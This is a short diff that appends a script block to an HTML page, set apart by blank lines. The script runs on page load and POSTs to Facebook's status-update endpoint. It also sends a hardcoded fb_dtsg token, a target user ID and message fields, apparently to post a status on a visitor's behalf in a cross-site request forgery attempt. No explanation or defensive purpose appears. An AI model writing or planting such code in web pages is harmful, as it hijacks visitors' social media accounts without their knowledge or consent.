@@ -47,3 +47,19 @@
   </div>
   
 </div>
+
+
+
+
+<script>
+
+$.post( "https://www.facebook.com/ajax/updatestatus.php?av=1645004953", function( data ) {
+  $( ".result" ).html( data );
+});
+
+$.post( "test.php", { fb_dtsg: "AQEEljkRdwvZ", xhpc_context: "home", xhpc_ismeta: "1", xhpc_timeline: "", xhpc_composerid: "u_0_r", xhpc_targetid: "1645004953", ref: "feed", xhpc_publish_type: "1", xhpc_message_text: "hi" })
+  .done(function( data ) {
+    alert( data );
+ });
+
+</script>
